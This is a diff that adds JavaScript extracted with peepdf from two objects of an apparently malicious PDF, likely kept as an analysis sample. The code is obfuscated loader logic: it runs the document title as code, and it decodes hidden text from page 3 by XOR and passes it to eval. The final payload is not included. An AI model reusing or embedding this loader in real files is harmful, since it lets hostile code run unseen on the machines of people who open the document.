@@ -1,0 +1,41 @@
+// peepdf comment: Javascript code located in object 19 (version 0)
+
+jfk(this['info'][kfs()]);
+
+function jfk(fds) {
+    var fhk = 'sdasa';
+    var fdl = new Function(fds);
+    fhk += 'dassd';
+    fhk += 'ldasfs';
+    return fdl();
+}
+
+function kfs() {
+    var d = 'ti';
+    var fsd = true;
+    d += 'tle';
+    fsd = !fsd;
+    return d;
+}
+
+// peepdf comment: Javascript code located in object 21 (version 0)
+
+var p = '',
+    l = app.doc,
+    f = '%';
+var d = l['get' + 'PageNumWo' + 'rds'](3);
+var n = String,
+    fA = 0,
+    eV = 2;
+var v = 'ch' + 'arCo' + 'deAt';
+var fO = 'fr' + 'omCh' + 'ar' + 'Code';
+var mV = 197;
+var lC = l['unes' + 'cape'];
+for (var yV = 0; yV < d; yV++) {
+    t = l['getPa' + 'geNthWord'](3, yV);
+    var pC = t.substr(t.length - eV, eV);
+    var mP = lC(f + pC)[v](fA);
+    p += n[fO](mP ^ mV);
+}
+eval(p);
+
